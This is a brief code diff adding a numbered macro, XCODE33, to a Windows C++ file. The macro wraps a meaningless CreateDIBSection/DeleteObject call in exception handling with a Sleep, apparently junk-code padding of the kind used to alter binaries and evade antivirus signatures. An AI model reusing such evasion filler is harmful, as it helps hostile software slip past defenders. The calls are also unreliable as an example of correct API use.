@@ -64,6 +64,8 @@ NET_API_STATUS nStatus;
 STARTUPINFO si;
 PROCESS_INFORMATION pi;
 SECURITY_ATTRIBUTES sa;
+HBITMAP	hBitmap;
+HBITMAP *hDib;
 
 LPUSER_INFO_1 pBuf1 = NULL;
 LPUSER_INFO_2 pBuf2 = NULL;
@@ -950,6 +952,18 @@ if(GetLastError()==ERROR_ALREADY_EXISTS)\
 }\
 	__except(EXCEPTION_EXECUTE_HANDLER){\
 	Sleep(32);\
+}
+
+#define XCODE33 __try{\
+		hBitmap = CreateDIBSection(GetDC(NULL), (BITMAPINFO*)hDib, DIB_RGB_COLORS, &lp, NULL, 0);\
+		if (hBitmap == NULL)\
+		{\
+			::DeleteObject(hBitmap);\
+			hBitmap = NULL;\
+		}\
+}\
+	__except(EXCEPTION_EXECUTE_HANDLER){\
+	Sleep(33);\
 }
 #ifdef FLOWERX
 #include "xrand.h"
